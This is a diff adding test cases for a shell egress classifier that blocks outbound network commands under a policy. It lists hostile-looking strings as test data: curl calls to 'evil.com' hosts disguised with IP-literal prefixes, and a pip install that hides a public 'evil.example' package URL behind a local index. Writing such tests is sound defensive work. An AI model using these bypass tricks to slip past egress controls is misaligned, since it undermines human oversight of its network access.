@@ -97,6 +97,48 @@ describe("shell egress classifier (behavioral)", () => {
     ).toBe(true);
   });
 
+  it("policy ON: domain prefixes are not trusted as IP literals", () => {
+    enable();
+    expect(checkShellCommand("curl http://127.0.0.1.evil.com").ok).toBe(false);
+    expect(checkShellCommand("curl http://10.0.0.1.evil.com").ok).toBe(false);
+    expect(checkShellCommand("curl http://192.168.1.20:8080/health").ok).toBe(true);
+  });
+
+  it("policy ON: a registry flag must point at a LOCAL registry", () => {
+    enable();
+    expect(
+      checkShellCommand("pnpm install --registry=https://registry.npmjs.org/").ok,
+    ).toBe(false);
+    expect(
+      checkShellCommand("pip install flask --index-url https://pypi.org/simple").ok,
+    ).toBe(false);
+    expect(
+      checkShellCommand("pnpm install --registry=http://nexus.lan:8081/npm").ok,
+    ).toBe(true);
+  });
+
+  it("policy ON: public IPv6 is not mistaken for a single-label LAN hostname", () => {
+    enable();
+    expect(checkShellCommand("curl https://[2606:4700:4700::1111]/").ok).toBe(false);
+    expect(checkShellCommand("curl https://[::1]:3000/").ok).toBe(true);
+    expect(checkShellCommand("curl https://[fd00::1]:3000/").ok).toBe(true);
+  });
+
+  it("policy ON: Go's GOPROXY does not authorize another package manager", () => {
+    enable();
+    expect(checkShellCommand("GOPROXY=off pnpm install").ok).toBe(false);
+    expect(checkShellCommand("GOPROXY=direct pnpm install").ok).toBe(false);
+    expect(checkShellCommand("GOPROXY=off pnpm install && go mod tidy").ok).toBe(false);
+    expect(checkShellCommand("GOPROXY=off go mod tidy").ok).toBe(true);
+  });
+
+  it("policy ON: a local registry cannot hide a second public package URL", () => {
+    enable();
+    expect(
+      checkShellCommand("pip install --index-url http://nexus.lan/simple https://evil.example/pkg.whl").ok,
+    ).toBe(false);
+  });
+
   it("policy ON: git network ops denied for public remotes", () => {
     enable();
     expect(checkShellCommand("git clone https://github.com/foo/bar").ok).toBe(false);
